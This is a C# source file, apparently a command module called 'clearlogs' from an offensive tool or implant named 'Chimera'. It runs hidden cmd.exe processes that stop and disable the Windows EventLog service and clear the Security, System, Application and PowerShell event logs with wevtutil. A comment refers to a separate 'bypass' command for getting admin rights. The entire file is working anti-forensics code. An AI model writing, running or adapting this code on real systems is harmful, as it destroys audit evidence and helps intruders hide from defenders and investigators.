using System;
using System.Diagnostics;
using System.ServiceProcess;

namespace Chimera.Commands
{
    // clearlogs — stop+disable Windows Event Log service, clear Security/System/Application logs.
    // Requires admin rights. Run 'bypass' first if not elevated.
    public static class ClearLogs
    {
        private static readonly string[] Logs =
            { "Security", "System", "Application", "Windows PowerShell" };

        public static string Execute()
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                // 1. Stop and disable the EventLog service
                try
                {
                    var svc = new ServiceController("EventLog");
                    if (svc.Status != ServiceControllerStatus.Stopped)
                    {
                        svc.Stop();
                        svc.WaitForStatus(ServiceControllerStatus.Stopped,
                            TimeSpan.FromSeconds(10));
                        sb.AppendLine("[+] EventLog service stopped.");
                    }
                    else
                    {
                        sb.AppendLine("[*] EventLog service was already stopped.");
                    }

                    // Disable via sc config
                    RunCmd("sc config EventLog start= disabled");
                    sb.AppendLine("[+] EventLog service disabled.");
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] Could not stop/disable EventLog: " + ex.Message);
                }

                // 2. Clear each log via wevtutil
                foreach (string log in Logs)
                {
                    try
                    {
                        string result = RunCmd("wevtutil cl \"" + log + "\"");
                        sb.AppendLine("[+] Cleared log: " + log);
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine("[-] Failed to clear " + log + ": " + ex.Message);
                    }
                }

                sb.AppendLine("[+] Log clearing complete.");
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] clearlogs: " + ex.Message);
            }
            return sb.ToString();
        }

        private static string RunCmd(string cmd)
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            };
            using (Process p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(10000);
                return o + e;
            }
        }
    }
}
